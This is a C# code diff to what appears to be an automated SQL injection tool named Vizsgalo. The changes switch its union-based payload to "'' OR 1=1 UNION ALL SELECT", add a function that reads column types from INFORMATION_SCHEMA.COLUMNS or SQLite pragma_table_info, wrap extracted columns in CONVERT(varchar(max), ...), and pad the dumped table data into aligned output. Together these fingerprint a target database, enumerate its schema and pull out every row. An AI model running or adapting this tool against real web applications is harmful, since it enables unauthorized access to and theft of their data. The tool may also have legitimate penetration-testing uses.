@@ -9,7 +9,7 @@ namespace Vizsgalo
         private static string _baseResponse = ""; // this is the base response which makes the base query (for comparing with the injected results later)
         
         private static readonly string AsterisksSeparator = new string('*', Console.WindowWidth);
-        private const string UnionStart = "'' OR 1=1 UNION SELECT ";
+        private const string UnionStart = "'' OR 1=1 UNION ALL SELECT ";
         private static int _unionNumber; // it represents how many plus columns we need to write in the union selects
         private static string _unionColumnsString = ""; // it represents the union columns (the default value is "" aka no extra column)
         private static string _db = "";
@@ -138,10 +138,12 @@ namespace Vizsgalo
             Console.WriteLine();
             if (tableName != "")
             {
+                string columnNames = await GetTableColumnNames(httpClient, tableName, firstParameter);
+                string columnTypes = await GetTableColumnTypes(httpClient, tableName, firstParameter);
+                string fullResponse = CreateTableSchemaResponse(columnNames, columnTypes);
                 InfoColors.WriteToConsole(InfoColors.ResponseCategory,
                     "\nThe given table's schema:");
-                string response = await GetTableColumns(httpClient, tableName, firstParameter);
-                InfoColors.WriteToConsole(InfoColors.ResponseResultText, response);
+                InfoColors.WriteToConsole(InfoColors.ResponseResultText, fullResponse);
             }
         }
 
@@ -293,7 +295,7 @@ namespace Vizsgalo
                 
                 InfoColors.WriteToConsole(InfoColors.ResponseResultText, 
                     "Checking for SQL Server or MySql first...");
-                _unionColumnsString = _unionColumnsString == "" ? "'1'" : _unionColumnsString + ",'1'";
+                _unionColumnsString = _unionColumnsString == "" ? "'0'" : _unionColumnsString + ",'0'";
                 string unionSqlServerOrMySql = unionUrlBase + _unionColumnsString + ", " + IsSqlServerOrMySql;
                 
                 unionResponse = await httpClient.GetAsync(unionSqlServerOrMySql);
@@ -537,7 +539,7 @@ namespace Vizsgalo
             return string.Join(" | ", response);
         }
         
-        static async Task<string> GetTableColumns(HttpClient httpClient, string tableName, string firstQueryParameter)
+        static async Task<string> GetTableColumnNames(HttpClient httpClient, string tableName, string firstQueryParameter)
         {
             string url = "?" + firstQueryParameter + "=" + UnionStart + _unionColumnsString + ", ";
             if (_db == "sqlserver" || _db == "mysql")
@@ -553,9 +555,25 @@ namespace Vizsgalo
             return string.Join(" | ", response);
         }
         
+        static async Task<string> GetTableColumnTypes(HttpClient httpClient, string tableName, string firstQueryParameter)
+        {
+            string url = "?" + firstQueryParameter + "=" + UnionStart + _unionColumnsString + ", ";
+            if (_db == "sqlserver" || _db == "mysql")
+            {
+                url += "DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '" + tableName + "';--";
+            } else if (_db == "sqlite")
+            {
+                url += "type FROM pragma_table_info('" + tableName + "');--";
+            }
+            
+            // sends GET request to server
+            string[] response = await GetRequest(httpClient, url);
+            return string.Join(" | ", response);
+        }
+        
         static async Task<string> GetDataFromTableColumn(HttpClient httpClient, string tableName, string columnName, string firstQueryParameter)
         { 
-            string url = "?" + firstQueryParameter + "=" + UnionStart + _unionColumnsString + ", " + columnName + " FROM " + tableName + ";--";
+            string url = "?" + firstQueryParameter + "=" + UnionStart + _unionColumnsString + ", CONVERT(varchar(max), " + columnName + ") FROM " + tableName + ";--";
             // sends GET request to server
             Console.WriteLine("Getting all data using " + _db + "...");
             string[] response = await GetRequest(httpClient, url);
@@ -566,7 +584,7 @@ namespace Vizsgalo
         {
             Console.WriteLine("Getting all data using " + _db + "...");
             
-            string res = await GetTableColumns(httpClient, tableName, firstQueryParameter);
+            string res = await GetTableColumnNames(httpClient, tableName, firstQueryParameter);
             string[] columnNames = res.Split(" | ");
 
             List<string[]> allData = new List<string[]>();
@@ -585,12 +603,26 @@ namespace Vizsgalo
             int rowNum = allData[0].Length + 1;
             string[] formattedRows = new string[rowNum];
             
+            // Calculate the maximum length of column names
+            int maxColumnNameLength = columnNames.Max(name => name.Length);
+            
             // the first row will be the column names
-            formattedRows[0] = string.Join("\t", columnNames); 
+            string firstRow = "";
+            for (int i = 0; i < columnNames.Length; i++)
+            {
+                firstRow += columnNames[i].PadRight(maxColumnNameLength + 5);
+            }
+            formattedRows[0] = firstRow; 
             
             for (int i = 1; i < rowNum; i++)
             {
-                formattedRows[i] = string.Join("\t", allData[i-1]);
+                string fullString = "";
+                for (int j = 0; j < allData.Count; j++)
+                {
+                    fullString += allData[j][i-1].PadRight(maxColumnNameLength + 5);
+                }
+
+                formattedRows[i] = fullString;
             }
 
             return string.Join("\n", formattedRows);
@@ -748,7 +780,7 @@ namespace Vizsgalo
             var finalFields = new List<string>();
             for (int i = 0; i < fields.Length; i++)
             {
-                if (!string.IsNullOrWhiteSpace(fields[i]) && !fields[i].Equals("1"))
+                if (!string.IsNullOrWhiteSpace(fields[i]) && !fields[i].Equals("0"))
                 {
                     finalFields.Add(WebUtility.HtmlDecode(fields[i]));
                 }
@@ -760,6 +792,24 @@ namespace Vizsgalo
         static bool AreEqual(double var1, double var2, double tolerance = 0.0001)
         {
             return Math.Abs(var1 - var2) < tolerance;
+        }
+        
+        // appends the column names with the column types
+        static string CreateTableSchemaResponse(string columnNamesString, string columnTypesString)
+        {
+            string[] columnNames = columnNamesString.Split(" | ");
+            string[] columnTypes = columnTypesString.Split(" | ");
+
+            // Calculate the maximum length of column names
+            int maxColumnNameLength = columnNames.Max(name => name.Length);
+            string response = "Column name".PadRight(maxColumnNameLength + 5) + "Column type";
+            
+            for (int i = 0; i < columnNames.Length; i++)
+            {
+                response += "\n" + columnNames[i].PadRight(maxColumnNameLength + 5) + (columnTypes.Length > i ? columnTypes[i] : "Unknown");
+            }
+            
+            return response;
         }
     }
 }
